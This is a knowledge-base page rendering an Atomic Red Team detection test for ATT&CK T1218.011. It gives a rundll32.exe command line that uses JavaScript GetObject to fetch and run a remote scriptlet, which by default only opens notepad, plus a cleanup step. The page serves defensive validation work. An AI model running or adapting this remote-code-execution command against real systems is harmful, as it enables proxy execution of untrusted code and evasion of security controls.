---
atomic_guid: "57ba4ce9-ee7a-4f27-9928-3c70c489b59d"
title: "Rundll32 execute JavaScript Remote Payload With GetObject"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.011"
attack_technique_name: "Signed Binary Proxy Execution: Rundll32"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "57ba4ce9-ee7a-4f27-9928-3c70c489b59d"
  - "Rundll32 execute JavaScript Remote Payload With GetObject"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. 
This has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)

Note: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed.

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

## Input Arguments

### file_url

- description: location of the payload
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct

## Executor

- name: command_prompt

### Command

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
```

### Cleanup

```cmd
taskkill /IM notepad.exe /f
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.yaml)
